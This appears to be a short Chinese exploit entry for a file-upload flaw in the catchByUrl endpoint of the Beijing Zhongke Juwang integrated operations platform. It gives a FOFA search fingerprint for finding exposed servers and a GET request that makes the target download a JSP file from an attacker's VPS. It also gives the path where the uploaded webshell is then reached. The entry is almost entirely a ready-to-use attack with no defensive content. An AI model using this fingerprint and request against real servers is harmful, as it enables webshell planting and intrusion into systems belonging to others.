# 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞

北京中科聚网一体化运营平台 ｜ 文件上传 ｜ —
- **指纹**：`FOFA：body="thirdparty/ueditor/WordPaster"`
- **请求**：`GET /resources/files/ue/catchByUrl?url=http://vpsip/exp.jsp HTTP/1.1`

**Payload**
```
http://ip/files/headimg/.jsp
```